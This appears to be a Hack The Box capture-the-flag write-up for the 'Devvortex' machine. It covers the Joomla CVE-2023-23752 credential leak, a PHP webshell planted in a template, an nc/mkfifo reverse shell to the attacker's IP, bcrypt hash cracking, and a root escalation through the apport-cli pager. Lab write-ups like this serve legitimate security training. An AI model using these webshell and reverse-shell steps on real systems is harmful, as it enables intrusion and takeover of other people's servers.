[Devvortex](https://app.hackthebox.com/machines/Devvortex) is an *easy* machine on HTB.

---

## Reconnaissance
We get an IP address `10.10.11.242`

```zsh
sudo nmap -sC -sV 10.10.11.242
```

We run a basic `nmap` scan against the target machine and find that the only open ports are 22, with SSH running, and 80 with an `nginx 1.18.0` server. We also see that the server redirected us to: `devvortex.htb`. This could be an indication that the server is VHosting and that we might be able to find other subdomains.

We add the domain to our `hosts` file so we can navigate the site using our browser.

```zsh
sudo sh -c 'echo "10.10.11.242 devvortex.htb" >> /etc/hosts'
```

Browsing on the site, it looks like a very uninteresting site which is mostly just static. There is a contact form that can be submitted, but investigating the network traffic with the developer tools shows that the submitting actually does not make any interesting request.

We perform some directory fuzzing and some vhost fuzzing to see if we can brute-force some interesting pages.

```zsh
gobuster dir -w wordlist.txt -u http://devvortex.htb/
gobuster vhost -w wordlist.txt -u 10.10.11.242 --domain devvortex.htb
```

The subdirectory scan finds the pages we already knew about and some additional ones that mostly return empty pages or 403s. The vohst fuzzing tells us there is a subdomain also running on this server: `dev.devvortex.htb` 

Adding this to our `hosts` file and opening the page in the browser reveals a similar but differently styled static webpage. Again, no interesting content can be found at all. When trying another directory fuzzing scan, we get very slow response times, making the scan take a large time. To prevent unnecessary waits like that, we can look at `/robots.txt` as that usually contains some interesting directories as well.

In the `robots.txt` file we learn that the webpage has been created using `Joomla!`. There is an `/administrator` page where one can administer the Joomla! setup. When navigating there we're met with a login screen and unfortunately non of the basic default credentials seem to be valid.

## Access to the administrator Joomla! account

Looking up the Joomla! software online reveals [2023-23752](https://nvd.nist.gov/vuln/detail/CVE-2023-23752) which is a vulnerability that lets us read sensitive information, including username and password, from the joomla `mysql` database in plaintext. The exploit (and road to code execution) is explained [here](https://vulncheck.com/blog/joomla-for-rce). We use `msfconsole` from MetaSploit to launch [this exploit script](https://www.exploit-db.com/exploits/51334) for this vulnerability. We can use the `check` function to indeed confirm that the version of Joomla on this server is vulnerable. 

The script shows us the login credentials for a user called `lewis`. On the [source](https://vulncheck.com/blog/joomla-for-rce) mentioned earlier, they explain that if the `mysql` database is internet facing, we can use these credentials to change the password of the `Super User` (administrator) of the Joomla! application. The database is not internet facing, however in the info gained from the exploit we learn that `lewis` is also a username for the Joomla! application. Turns out the Joomla account for `lewis` uses the same password and we can login into the `/administrator` portal.

## RCE and Reverse Shell

From here, the source mentioned earlier explains clearly how we can get RCE going. We can edit the template for the `dev.devvortex.htb` site and add in some malicious `php` code that gets us a webshell. With this webshell we can then have the system create a reverse shell into our machine. We change the `/error.php` file for the template and include this (url-encoding so sending over the reverse shell command is easier)

```php
$decodedCmd = urldecode($_GET['cmd']);
system($decodedCmd);
```

We first check whether we indeed have a webshell by trying:
```zsh
curl dev.devvortex.htb/error.php\?cmd\=whoami
```
Which indeed returns `www-data` as expected. The let's create an `nc` listener and activate the reverse shell with the url-encoding of `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.15.100 1234 >/tmp/f`
```zsh
nc -lvnp 1234
curl dev.devvortex.htb/error.php\?cmd\=rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fsh%20-i%202%3E%261%7Cnc%2010.10.15.100%201234%20%3E%2Ftmp%2Ff
```

## User pwn
On the system, we see that there is a `/home/logan/` directory which has the `user.txt` flag that we're after. We do not know of any password for the `logan` user. We do have `mysql` credentials for the `lewis` user and so we open the database as `lewis` as there might be something interesting. 

```zsh
mysql -u lewis -p
```

We use `show databases;` and see there is a `joomla` database, which is also the one we extracted some values from earlier. In the `.._users` table we find the two users `lewis` and `logan` and their hashed passwords. Let's download the hashed password for `logan`, use `john` to brute-force it and hope they use the same password for their login on the machine.

```zsh
john -w:rockyou.txt hash.txt
```
`john` is able to determine the type of encryption `BCrypt` and find the right password. Using the same password with `su logan` indeed logs us in as `logan` and lets us read the `user.txt` flag.

## Privilege escalation
Checking `sudo -l` (one of the first things I always check), we find that we can run `apport-cli` as root. Looking this program up online tells us that it uses a pager and thus we can get a root shell going through this pager. We use:

```zsh
sudo apport-cli --file-bug
```
We can generate an arbitrary bug report and view it in the pager. Now typing `!bin/bash` in the pager gets us a shell as root. We can now read the `root.txt` file in the `/root` directory and we have pwned the machine!